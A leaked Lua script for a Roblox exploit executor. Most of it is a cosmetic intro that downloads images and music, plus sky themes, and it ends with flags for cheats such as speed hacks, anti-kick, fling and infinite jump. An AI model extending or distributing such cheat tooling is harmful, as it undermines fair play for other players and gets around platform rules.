-- leak by FS│https://discord.gg/TBBAUZu8cW
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local HS = game:GetService("HttpService")
local player = Players.LocalPlayer

-- ------------------------------------------------------------
-- EARLY CONFIG LOAD (for intro sound setting)
-- ------------------------------------------------------------
if isfile and isfile("RXZ_HUB.json") then
    local ok2, d2 = pcall(function() return HS:JSONDecode(readfile("RXZ_HUB.json")) end)
    if ok2 and type(d2)=="table" then
        if type(d2.backgroundEnabled)=="boolean" then backgroundEnabled=d2.backgroundEnabled end
        if type(d2.backgroundIndex)=="number" then backgroundIndex=d2.backgroundIndex end
    end
end

repeat task.wait() until game:IsLoaded()

-- ------------------------------------------------------------
-- INTRO — Clean cinematic logo (Fiction Duels style animation)
-- Image keeps original shape | Smooth scale + soft float
-- 15s max | tap to skip
-- Updated: Discord invite in circle intro
-- ------------------------------------------------------------
task.spawn(function()
    local Players      = game:GetService("Players")
    local TweenService = game:GetService("TweenService")

    -- remove leftover intros that can block the whole screen
    pcall(function()
        for _,name in ipairs({"VoidVS_Intro","BerserkVS_Intro"}) do
            local cg = game:GetService("CoreGui")
            local old = cg:FindFirstChild(name)
            if old then old:Destroy() end
            local pg = Players.LocalPlayer and Players.LocalPlayer:FindFirstChild("PlayerGui")
            if pg then
                local o = pg:FindFirstChild(name)
                if o then o:Destroy() end
            end
        end
    end)

    local IMG_URL  = "https://files.catbox.moe/rq2ilr.png"
    local IMG_FILE = "voidvs_intro.png"
    local DURATION = 15

    -- ========== FIXED getcustomasset LOADING ==========
    local imgAsset = ""

    local function downloadImage()
        local raw = nil

        local ok, result = pcall(function()
            return game:HttpGet(IMG_URL)
        end)
        if ok and result and #result > 100 then
            raw = result
        end

        if not raw and syn and syn.request then
            local res = syn.request({Url = IMG_URL, Method = "GET"})
            if res and res.Body and #res.Body > 100 then
                raw = res.Body
            end
        end

        if not raw then
            local reqFunc = (http and http.request) or request
            if reqFunc then
                local res = reqFunc({Url = IMG_URL, Method = "GET"})
                if res and res.Body and #res.Body > 100 then
                    raw = res.Body
                end
            end
        end

        return raw
    end

    local function getAssetFromFile(fileName)
        pcall(function()
            if isfile and isfile(fileName) then
                delfile(fileName)
            end
        end)

        local raw = downloadImage()
        if not raw then return "" end

        local writeOk = pcall(function()
            writefile(fileName, raw)
        end)
        if not writeOk then return "" end

        task.wait(0.05)

        local assetFuncs = {
            getcustomasset,
            getsynasset,
            getasset,
        }

        for _, func in ipairs(assetFuncs) do
            if typeof(func) == "function" then
                local success, asset = pcall(function()
                    return func(fileName)
                end)
                if success and type(asset) == "string" and asset ~= "" then
                    return asset
                end
            end
        end

        if typeof(getcustomasset) == "function" then
            local success, asset = pcall(function()
                return getcustomasset(fileName, true)
            end)
            if success and type(asset) == "string" and asset ~= "" then
                return asset
            end
        end

        return ""
    end

    imgAsset = getAssetFromFile(IMG_FILE)

    -- ========== INTRO SONG (fast cache + random playlist) ==========
    local introSound = nil
    task.spawn(function()
        pcall(function()
            -- Playlist: pick a random song every execute
            local PLAYLIST = {
                {url = "https://files.catbox.moe/oqex53.mp3", file = "voidvs_intro_a.mp3", startAt = 0},
                {url = "https://files.catbox.moe/cf8fyf.mp3", file = "voidvs_intro_b.mp3", startAt = 0},
            }
            math.randomseed(tick() % 1e9 * 1000)
            local pick = PLAYLIST[math.random(1, #PLAYLIST)]
            local SONG_URL, SONG_FILE, START_AT = pick.url, pick.file, pick.startAt or 0

            local function resolveAsset(fileName)
                local assetFuncs = {getcustomasset, getsynasset, getasset}
                for _, func in ipairs(assetFuncs) do
                    if typeof(func) == "function" then
                        local success, a = pcall(function() return func(fileName) end)
                        if success and type(a) == "string" and a ~= "" then
                            return a
                        end
                    end
                end
                if typeof(getcustomasset) == "function" then
                    local success, a = pcall(function() return getcustomasset(fileName, true) end)
                    if success and type(a) == "string" and a ~= "" then
                        return a
                    end
                end
                return ""
            end

            -- Prefer cached file (no re-download delay)
            local asset = ""
            if isfile and isfile(SONG_FILE) then
                asset = resolveAsset(SONG_FILE)
            end

            -- Download only if missing / cache failed
            if asset == "" then
                local raw = nil
                local ok, result = pcall(function() return game:HttpGet(SONG_URL) end)
                if ok and result and #result > 100 then
                    raw = result
                end
                if not raw then
                    local reqFunc = (http and http.request) or request or (syn and syn.request)
                    if reqFunc then
                        local res = reqFunc({Url = SONG_URL, Method = "GET"})
                        if res and res.Body and #res.Body > 100 then
                            raw = res.Body
                        end
                    end
                end
                if not raw then return end
                local writeOk = pcall(function() writefile(SONG_FILE, raw) end)
                if not writeOk then return end
                asset = resolveAsset(SONG_FILE)
            end
            if asset == "" then return end

            local SoundService = game:GetService("SoundService")
            -- kill any leftover intro sound
            pcall(function()
                local old = SoundService:FindFirstChild("VoidVS_IntroSong")
                if old then old:Stop(); old:Destroy() end
            end)

            introSound = Instance.new("Sound")
            introSound.Name = "VoidVS_IntroSong"
            introSound.SoundId = asset
            introSound.Volume = 1
            introSound.Looped = false
            introSound.Parent = SoundService

            local played = false
            local function tryPlay()
                if played or not introSound or not introSound.Parent then return end
                played = true
                pcall(function()
                    introSound.TimePosition = START_AT
                    introSound:Play()
                end)
            end

            if introSound.IsLoaded then
                tryPlay()
            else
                introSound.Loaded:Connect(tryPlay)
                -- short fallback only (cache usually loads instantly)
                task.delay(0.35, tryPlay)
            end
        end)
    end)

    local sg = Instance.new("ScreenGui")
    sg.Name           = "VoidVS_Intro"
    sg.IgnoreGuiInset = true
    sg.ResetOnSpawn   = false
    sg.DisplayOrder   = 100000
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(sg) end end)
    if not pcall(function() sg.Parent = game:GetService("CoreGui") end) then
        sg.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    end

    local finished = false
    local imgLabel, moon, glowRing, outerGlow, tapLbl, discordLbl = nil, nil, nil, nil, nil, nil
    local skipBtn = nil

    local function destroyIntro()
        if finished then return end
        finished = true
        pcall(function()
            if skipBtn then skipBtn.Active=false; skipBtn.Visible=false end
            if sg then sg.Enabled=false end
        end)
        pcall(function()
            if introSound then introSound:Stop(); introSound:Destroy() end
        end)
        local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
        local targets = {imgLabel, moon, glowRing, outerGlow, tapLbl, discordLbl}
        for _, obj in ipairs(targets) do
            if obj then
                pcall(function()
                    if obj:IsA("ImageLabel") then
                        TweenService:Create(obj, fadeInfo, {
                            ImageTransparency = 1,
                            Size = obj.Size - UDim2.new(0, 30, 0, 30)
                        }):Play()
                    elseif obj:IsA("TextLabel") then
                        TweenService:Create(obj, fadeInfo, {
                            TextTransparency = 1,
                            TextStrokeTransparency = 1
                        }):Play()
                    else
                        TweenService:Create(obj, fadeInfo, {
                            BackgroundTransparency = 1,
                            Size = obj.Size - UDim2.new(0, 25, 0, 25)
                        }):Play()
                    end
                end)
            end
        end
        -- fade chain trails
        pcall(function()
            local stage = sg and sg:FindFirstChild("ChainSpearStage")
            if stage then
                for _, d in ipairs(stage:GetDescendants()) do
                    if d:IsA("ImageLabel") then
                        TweenService:Create(d, fadeInfo, {ImageTransparency = 1}):Play()
                    end
                end
            end
        end)
        task.wait(0.25)
        pcall(function() sg:Destroy() end)
    end

    local dim = Instance.new("Frame", sg)
    dim.Size = UDim2.new(1,0,1,0)
    dim.BackgroundColor3 = Color3.fromRGB(0,0,0)
    dim.BackgroundTransparency = 0.82
    dim.BorderSizePixel = 0
    dim.ZIndex = 1

    moon = Instance.new("ImageLabel", sg)
    moon.Name = "Moon"
    moon.Size = UDim2.new(0, 480, 0, 480)
    moon.Position = UDim2.new(0.5, 0, 0.5, -20)
    moon.AnchorPoint = Vector2.new(0.5, 0.5)
    moon.BackgroundTransparency = 1
    moon.Image = "rbxassetid://6031097222"
    moon.ImageTransparency = 0.62
    moon.ImageColor3 = Color3.fromRGB(210, 225, 255)
    moon.ZIndex = 2
    moon.ScaleType = Enum.ScaleType.Fit

    local moonGlow = Instance.new("Frame", sg)
    moonGlow.Size = UDim2.new(0, 520, 0, 520)
    moonGlow.Position = UDim2.new(0.5, 0, 0.5, -20)
    moonGlow.AnchorPoint = Vector2.new(0.5, 0.5)
    moonGlow.BackgroundColor3 = Color3.fromRGB(160, 190, 255)
    moonGlow.BackgroundTransparency = 0.94
    moonGlow.BorderSizePixel = 0
    moonGlow.ZIndex = 1
    Instance.new("UICorner", moonGlow).CornerRadius = UDim.new(1, 0)

    outerGlow = Instance.new("Frame", sg)
    outerGlow.Size = UDim2.new(0, 0, 0, 0)
    outerGlow.Position = UDim2.new(0.5, 0, 0.5, -8)
    outerGlow.AnchorPoint = Vector2.new(0.5, 0.5)
    outerGlow.BackgroundColor3 = Color3.fromRGB(140, 180, 255)
    outerGlow.BackgroundTransparency = 1
    outerGlow.BorderSizePixel = 0
    outerGlow.ZIndex = 3
    Instance.new("UICorner", outerGlow).CornerRadius = UDim.new(1, 0)

    glowRing = Instance.new("Frame", sg)
    glowRing.Size = UDim2.new(0, 0, 0, 0)
    glowRing.Position = UDim2.new(0.5, 0, 0.5, -8)
    glowRing.AnchorPoint = Vector2.new(0.5, 0.5)
    glowRing.BackgroundColor3 = Color3.fromRGB(180, 210, 255)
    glowRing.BackgroundTransparency = 1
    glowRing.BorderSizePixel = 0
    glowRing.ZIndex = 4
    Instance.new("UICorner", glowRing).CornerRadius = UDim.new(1, 0)
    local glowStroke = Instance.new("UIStroke", glowRing)
    glowStroke.Color = Color3.fromRGB(200, 230, 255)
    glowStroke.Thickness = 2
    glowStroke.Transparency = 1

    imgLabel = Instance.new("ImageLabel", sg)
    imgLabel.Size = UDim2.new(0, 14, 0, 14)
    imgLabel.Position = UDim2.new(0.5, 0, 0.5, -8)
    imgLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    imgLabel.BackgroundTransparency = 1
    imgLabel.ScaleType = Enum.ScaleType.Fit
    imgLabel.ImageTransparency = 1
    imgLabel.ZIndex = 7
    if imgAsset ~= "" then
        imgLabel.Image = imgAsset
    else
        imgLabel.Image = IMG_URL
    end
    task.delay(0.15, function()
        if imgLabel and imgLabel.Parent and (imgLabel.Image == "" or imgLabel.Image == nil) then
            imgLabel.Image = IMG_URL
        end
    end)

    task.spawn(function()
        TweenService:Create(imgLabel, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            ImageTransparency = 0
        }):Play()
        task.delay(0.05, function()
            TweenService:Create(imgLabel, TweenInfo.new(0.55, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 235, 0, 235)
            }):Play()
        end)
        task.delay(0.7, function()
            TweenService:Create(imgLabel, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 210, 0, 210)
            }):Play()
        end)
        task.delay(0.15, function()
            TweenService:Create(glowRing, TweenInfo.new(0.9, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 300, 0, 300),
                BackgroundTransparency = 0.88
            }):Play()
            TweenService:Create(glowStroke, TweenInfo.new(0.9, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Transparency = 0.65
            }):Play()
        end)
        task.delay(0.25, function()
            TweenService:Create(outerGlow, TweenInfo.new(1.1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 390, 0, 390),
                BackgroundTransparency = 0.93
            }):Play()
        end)
    end)

    task.spawn(function()
        local t = 0
        while not finished do
            t = t + 0.016
            local floatY = math.sin(t * 0.7) * 11
            local breath = 1 + math.sin(t * 0.5) * 0.015
            local rot = math.sin(t * 0.25) * 0.9
            if imgLabel and imgLabel.Parent then
                imgLabel.Position = UDim2.new(0.5, 0, 0.5, -8 + floatY)
                imgLabel.Rotation = rot
                imgLabel.Size = UDim2.new(0, 210 * breath, 0, 210 * breath)
            end
            if glowRing and glowRing.Parent then
                local pulse = 1 + math.sin(t * 0.65) * 0.02
                glowRing.Size = UDim2.new(0, 300 * pulse, 0, 300 * pulse)
                glowRing.Position = UDim2.new(0.5, 0, 0.5, -8 + floatY * 0.55)
                glowRing.BackgroundTransparency = 0.87 + math.sin(t * 0.8) * 0.035
            end
            if outerGlow and outerGlow.Parent then
                local pulse2 = 1 + math.sin(t * 0.45) * 0.025
                outerGlow.Size = UDim2.new(0, 390 * pulse2, 0, 390 * pulse2)
                outerGlow.Position = UDim2.new(0.5, 0, 0.5, -8 + floatY * 0.3)
            end
            if moon and moon.Parent then
                local my = math.sin(t * 0.22) * 7
                moon.Position = UDim2.new(0.5, 0, 0.5, -20 + my)
                moon.Rotation = t * 0.35
                moonGlow.Position = moon.Position
            end
            task.wait()
        end
    end)

    local function makeOrbiter(radius, size, speed, phase, color)
        local orb = Instance.new("Frame", sg)
        orb.Size = UDim2.new(0, size, 0, size)
        orb.AnchorPoint = Vector2.new(0.5, 0.5)
        orb.BackgroundColor3 = color
        orb.BackgroundTransparency = 0.5
        orb.BorderSizePixel = 0
        orb.ZIndex = 5
        Instance.new("UICorner", orb).CornerRadius = UDim.new(1, 0)
        task.spawn(function()
            local t = phase
            while orb and orb.Parent and not finished do
                t = t + 0.016 * speed
                local x = math.cos(t) * radius
                local y = math.sin(t) * radius * 0.7
                orb.Position = UDim2.new(0.5, x, 0.5, -8 + y)
                orb.BackgroundTransparency = 0.4 + math.abs(math.sin(t * 1.3)) * 0.35
                task.wait()
            end
        end)
    end
    makeOrbiter(155, 6, 0.65, 0, Color3.fromRGB(180, 210, 255))
    makeOrbiter(165, 5, 0.85, 1.8, Color3.fromRGB(200, 180, 255))
    makeOrbiter(145, 5, 0.55, 3.2, Color3.fromRGB(160, 240, 255))
    makeOrbiter(175, 4, 0.95, 4.5, Color3.fromRGB(255, 255, 255))

    -- ========== ADAPT-STYLE CHAIN TRAIL ROTORS ==========
    local TRAIL_COLOR = Color3.fromRGB(205, 215, 235)
    local TRAIL_IMG = "rbxassetid://118963313877514"
    local chainStage = Instance.new("Frame", sg)
    chainStage.Name = "ChainSpearStage"
    chainStage.AnchorPoint = Vector2.new(0.5, 0.5)
    chainStage.Position = UDim2.new(0.5, 0, 0.5, -8)
    chainStage.Size = UDim2.new(0, 280, 0, 280)
    chainStage.BackgroundTransparency = 1
    chainStage.ZIndex = 3
    local rotorData = {
        {rot=-1094.822,trans=0.998},
        {rot=-1095.4,trans=0.998},
        {rot=-1095.978,trans=0.996},
        {rot=-1096.515,trans=0.995},
        {rot=-1097.052,trans=0.993},
        {rot=-1097.548,trans=0.991},
        {rot=-1098.004,trans=0.988},
        {rot=-1098.419,trans=0.985},
        {rot=-1098.794,trans=0.982},
        {rot=-1099.128,trans=0.978},
        {rot=-1099.421,trans=0.973},
    }
    local rotors = {}
    for i, data in ipairs(rotorData) do
        local rotor = Instance.new("Frame", chainStage)
        rotor.Name = "ChainSpearRotor"..i
        rotor.AnchorPoint = Vector2.new(0.5, 0.5)
        rotor.Position = UDim2.new(0.5, 0, 0.5, 0)
        rotor.Size = UDim2.new(1, 0, 1, 0)
        rotor.BackgroundTransparency = 1
        rotor.Rotation = data.rot
        rotor.ZIndex = 3
        local trail = Instance.new("ImageLabel", rotor)
        trail.Name = "ChainSpearTrail"..i
        trail.AnchorPoint = Vector2.new(0.73, 0.02)
        trail.Position = UDim2.new(0.5, 0, 0.5, 0)
        trail.Size = UDim2.new(0.553, 0, 0.829, 0)
        trail.BackgroundTransparency = 1
        trail.Image = TRAIL_IMG
        trail.ImageColor3 = TRAIL_COLOR
        trail.ImageTransparency = data.trans
        trail.ScaleType = Enum.ScaleType.Fit
        trail.ZIndex = 3
        table.insert(rotors, {rotor=rotor, trail=trail, idx=i})
    end
    task.spawn(function()
        for _, r in ipairs(rotors) do
            task.delay((r.idx-1)*0.035, function()
                if finished or not r.trail or not r.trail.Parent then return end
                TweenService:Create(r.trail, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    ImageTransparency = 0.12
                }):Play()
            end)
            task.spawn(function()
                local speed = 0.38 + (r.idx * 0.045)
                while not finished and r.rotor and r.rotor.Parent do
                    r.rotor.Rotation = r.rotor.Rotation + speed
                    RunService.Heartbeat:Wait()
                end
            end)
        end
    end)

    -- ========== TAP TO SKIP + DISCORD (pulse, non-copyable) ==========
    tapLbl = Instance.new("TextLabel", sg)
    tapLbl.Name = "TapAnywhere"
    tapLbl.AnchorPoint = Vector2.new(0.5, 0)
    tapLbl.Position = UDim2.new(0.5, 0, 0.5, 120)
    tapLbl.Size = UDim2.new(0, 280, 0, 22)
    tapLbl.BackgroundTransparency = 1
    tapLbl.Text = "tap to skip"
    tapLbl.Font = Enum.Font.Gotham
    tapLbl.TextSize = 14
    tapLbl.TextColor3 = Color3.fromRGB(220, 225, 235)
    tapLbl.TextTransparency = 1
    tapLbl.TextStrokeTransparency = 0.5
    tapLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    tapLbl.ZIndex = 12

    discordLbl = Instance.new("TextLabel", sg)
    discordLbl.Name = "DiscordInvite"
    discordLbl.AnchorPoint = Vector2.new(0.5, 0)
    discordLbl.Position = UDim2.new(0.5, 0, 0.5, 148)
    discordLbl.Size = UDim2.new(0, 320, 0, 20)
    discordLbl.BackgroundTransparency = 1
    discordLbl.Text = "discord.gg/GGFWZFUJgA"
    discordLbl.Font = Enum.Font.GothamBold
    discordLbl.TextSize = 13
    discordLbl.TextColor3 = Color3.fromRGB(180, 200, 255)
    discordLbl.TextTransparency = 1
    discordLbl.TextStrokeTransparency = 0.55
    discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    discordLbl.ZIndex = 12
    -- non-copyable (display only)
    discordLbl.Active = false
    discordLbl.Selectable = false

    task.delay(0.55, function()
        if finished then return end
        if tapLbl and tapLbl.Parent then
            TweenService:Create(tapLbl, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                TextTransparency = 0.15
            }):Play()
        end
        if discordLbl and discordLbl.Parent then
            TweenService:Create(discordLbl, TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                TextTransparency = 0.25
            }):Play()
        end
    end)

    task.spawn(function()
        while not finished and tapLbl and tapLbl.Parent do
            TweenService:Create(tapLbl, TweenInfo.new(0.65, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                TextTransparency = 0.48
            }):Play()
            task.wait(0.65)
            if finished then break end
            TweenService:Create(tapLbl, TweenInfo.new(0.65, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                TextTransparency = 0.05
            }):Play()
            task.wait(0.65)
        end
    end)

    skipBtn = Instance.new("TextButton", sg)
    skipBtn.Size = UDim2.new(1,0,1,0)
    skipBtn.BackgroundTransparency = 1
    skipBtn.Text = ""
    skipBtn.ZIndex = 30
    skipBtn.Active = true
    skipBtn.AutoButtonColor = false
    skipBtn.MouseButton1Click:Connect(function()
        if not finished then destroyIntro() end
    end)

    task.delay(DURATION, function()
        if not finished then destroyIntro() end
    end)
end)

-- ============================================================
-- SKY THEME SYSTEM
-- ============================================================
local CANDY_SKY_TAG = "MoveeSkyTheme"
local currentSkyTheme = "Night"
local CANDY_SKY_PRESETS = {
    ["Off"]={kind="off"},
    ["Night"]={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
    ["Aurora"]={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
    ["Sunset"]={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
    ["Galaxy"]={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
    ["Cyber"]={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
    ["Sakura"]={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
    ["Volcanic"]={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
    ["Arctic"]={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
    ["Vaporwave"]={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.5,dens=0.55,color={200,150,255}}},
    ["Toxic"]={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
    ["Hellscape"]={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
    ["Heaven"]={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
    ["Storm"]={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
    ["Sunrise"]={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
    ["Inferno"]={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
}
local SkyOrder={"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}
function candyColor(rgb) return Color3.fromRGB(rgb[1],rgb[2],rgb[3]) end
function CandyApplyCustomSky(mode)
    for _,child in ipairs(Lighting:GetChildren()) do if child:GetAttribute(CANDY_SKY_TAG) then pcall(function() child:Destroy() end) end end
    local terrain=workspace:FindFirstChildOfClass("Terrain")
    if terrain then for _,child in ipairs(terrain:GetChildren()) do if child:GetAttribute(CANDY_SKY_TAG) then pcall(function() child:Destroy() end) end end end
    local preset=CANDY_SKY_PRESETS[mode]
    if not preset or preset.kind=="off" then Lighting.ClockTime=14;Lighting.Brightness=2;Lighting.OutdoorAmbient=Color3.fromRGB(127,127,127);Lighting.Ambient=Color3.fromRGB(127,127,127);Lighting.FogEnd=100000;Lighting.GlobalShadows=true;return end
    Lighting.FogStart=0;Lighting.FogEnd=100000;Lighting.FogColor=Color3.fromRGB(200,200,200);Lighting.ColorShift_Top=Color3.fromRGB(0,0,0);Lighting.ColorShift_Bottom=Color3.fromRGB(0,0,0);Lighting.GlobalShadows=true
    Lighting.ClockTime=preset.clock or 14;Lighting.Brightness=preset.brightness or 2
    if preset.outAmb then Lighting.OutdoorAmbient=candyColor(preset.outAmb) end
    if preset.ambient then Lighting.Ambient=candyColor(preset.ambient) end
    if preset.sky then
        local skyInst=Instance.new("Sky");skyInst:SetAttribute(CANDY_SKY_TAG,true)
        if preset.sky.stars then skyInst.StarCount=preset.sky.stars end
        if preset.sky.moon then skyInst.MoonAngularSize=preset.sky.moon end
        if preset.sky.sun then skyInst.SunAngularSize=preset.sky.sun end
        if preset.sky.moonTex then skyInst.MoonTextureId="rbxasset://sky/moon.jpg" end
        skyInst.Parent=Lighting
    end
    if preset.atm then
        local atm=Instance.new("Atmosphere");atm:SetAttribute(CANDY_SKY_TAG,true)
        atm.Density=preset.atm.dens or 0.3;atm.Color=candyColor(preset.atm.color);atm.Decay=candyColor(preset.atm.decay);atm.Glare=preset.atm.glare or 1;atm.Haze=preset.atm.haze or 1;atm.Parent=Lighting
    end
    if preset.clouds and terrain then
        local clouds=Instance.new("Clouds");clouds:SetAttribute(CANDY_SKY_TAG,true)
        clouds.Cover=preset.clouds.cover or 0.5;clouds.Density=preset.clouds.dens or 0.5;clouds.Color=candyColor(preset.clouds.color);clouds.Parent=terrain
    end
end

-- ============================================================
-- STATE
-- ============================================================
local TS=TweenService
local LP=Players.LocalPlayer

-- Robust image loader (PC + mobile executors)
function loadCustomImageAsset(url, fileName)
    if not url or url == "" then return "" end
    fileName = fileName or ("void_img_" .. tostring(math.floor(tick()*1000)) .. ".png")
    local function resolve(path)
        local funcs = {getcustomasset, getsynasset, getasset}
        for _, f in ipairs(funcs) do
            if typeof(f) == "function" then
                local ok, a = pcall(function() return f(path) end)
                if ok and type(a) == "string" and a ~= "" then return a end
            end
        end
        if typeof(getcustomasset) == "function" then
            local ok, a = pcall(function() return getcustomasset(path, true) end)
            if ok and type(a) == "string" and a ~= "" then return a end
        end
        return ""
    end
    -- cache hit
    if isfile and isfile(fileName) then
        local a = resolve(fileName)
        if a ~= "" then return a end
    end
    local raw = nil
    pcall(function()
        local body = game:HttpGet(url)
        if body and #body > 80 then raw = body end
    end)
    if not raw then
        local req = (syn and syn.request) or (http and (http.request or http.Request)) or request or http_request
        if req then
            local ok, res = pcall(function()
                return req({Url = url, Method = "GET", Headers = {["User-Agent"]="Mozilla/5.0"}})
            end)
            if ok and type(res) == "table" then
                raw = res.Body or res.body or res.Data or res.data
            elseif ok and type(res) == "string" then
                raw = res
            end
        end
    end
    if not raw or #raw < 80 then return url end -- last resort: raw url
    pcall(function()
        if writefile then writefile(fileName, raw) end
    end)
    task.wait(0.05)
    local asset = resolve(fileName)
    if asset ~= "" then return asset end
    return url
end


local NS,CS=59,9
local LAGGER_SPEED=30
local LAGGER_CARRY_SPEED=15
local carrySpeedActive = false
local laggerModeEnabled = false
local antiDieEnabled = true
local FLING_THRESHOLD = 80
local antiRagdollEnabled,infJumpEnabled=false,false
local medusaCounterEnabled,batCounterEnabled,unwalkEnabled=false,false,false
local medusaDebounce,medusaLastUsed,dropActive=false,0,false
local RXZ={antiKick=true,brainrot=false,tpBat=false,batV2=false,tpConn=nil,v2Conn=nil,v2Rot=nil,hitCD=false,v2CD=false}
local autoLeftEnabled,autoRightEnabled=false,false
